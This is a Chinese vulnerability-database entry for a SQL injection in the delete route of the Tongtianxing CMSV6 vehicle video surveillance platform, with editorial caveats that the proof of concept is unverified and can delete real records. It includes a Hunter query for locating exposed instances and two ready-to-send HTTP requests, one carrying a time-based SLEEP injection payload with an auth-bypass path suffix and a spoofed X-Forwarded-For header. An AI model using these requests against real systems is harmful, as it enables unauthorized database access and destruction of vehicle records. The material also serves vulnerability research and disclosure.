---
fofa: ""
source: "wy876 漏洞文库"
product: "通天星 CMSV6 车载视频监控平台"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
category_recommendation: "IOT安全/其他设备"
fofa_unverified: "web.body="
title: "通天星CMSV6车载视频监控平台muck_vehi_certificate存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：muck_vehi_certificatedelete;matrixsuffix/XFF;ids;certificate-recorddeletionrisk"
side_effects: "未执行；本文需注意的操作影响：具体副作用：本文 delete 路由会涉及 车辆证件记录；把 ids=1 等正常参数当“安全对照”仍可能删除真实业务数据。原探针与方法保留，但测试对象必须是可恢复的隔离记录，须核事前/事后状态。"
source_status: "unknown"
id: "vw-4a6cf98ff3c7b2d755f64860"
entity_id: "ve-4a6cf98ff3c7b2d755f64860"
schema_version: "1"
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

- 具体副作用：本文 delete 路由会涉及 车辆证件记录；把 ids=1 等正常参数当“安全对照”仍可能删除真实业务数据。原探针与方法保留，但测试对象必须是可恢复的隔离记录，须核事前/事后状态。
- JSESSIONID、矩阵路径后缀与 X-Forwarded-For 的出现不能替代路由鉴权证明；只有 URL/请求或 sqlmap 标签，没有配对响应/时延证据，短延迟不能直接判 SQLi。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：muck_vehi_certificatedelete;matrixsuffix/XFF;ids;certificate-recorddeletionrisk

- **操作与副作用边界（1）**：正常ids1与SQLi探针可能删车辆证件记录，检测副作用未标。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **操作与副作用边界（2）**：与其他delete复制相似但不同证件模块，应分别保留证据需求。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **适用与权限边界（3）**：无响应/时延/具体版本/权限与修复，不能仅示例推数据库任意篡改。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（4）**：行业类别/Hunter元数据错，语雀来源可回源。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 通天星CMSV6车载视频监控平台 muck_vehi_certificate存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台muck_vehi_certificate存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征


# 四、漏洞复现
```http
GET /muck_vehi_certificate/delete;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 HTTP/1.1
Host: 192.168.31.228
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
```


```http
GET /muck_vehi_certificate/delete;downloadLogger.action?ids=1 HTTP/1.1
Host: 192.168.31.228
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qzw4gmu01hbpgfik>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
